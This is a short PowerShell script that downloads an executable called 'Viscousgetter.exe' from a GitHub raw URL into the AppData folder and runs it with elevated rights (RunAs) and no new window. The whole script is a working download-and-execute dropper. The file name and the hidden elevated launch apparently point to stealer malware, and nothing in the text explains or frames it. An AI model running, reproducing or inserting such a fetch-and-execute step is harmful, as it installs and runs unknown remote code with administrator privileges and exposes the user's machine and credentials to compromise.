$VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
$VISPath = "$env:AppData\Viscousgetter.exe"

# Download the file
Invoke-WebRequest -Uri $VIS -OutFile $VISPath -Verbose

# Validate file exists
If (!(Test-Path -Path $VISPath)) {
    Write-Error "File download failed!"
    Exit
}

# Run the file
Try {
    Start-Process -FilePath $VISPath -NoNewWindow -Wait -Verb RunAs
} Catch {
    Write-Error "Execution failed: $($_.Exception.Message)"
}
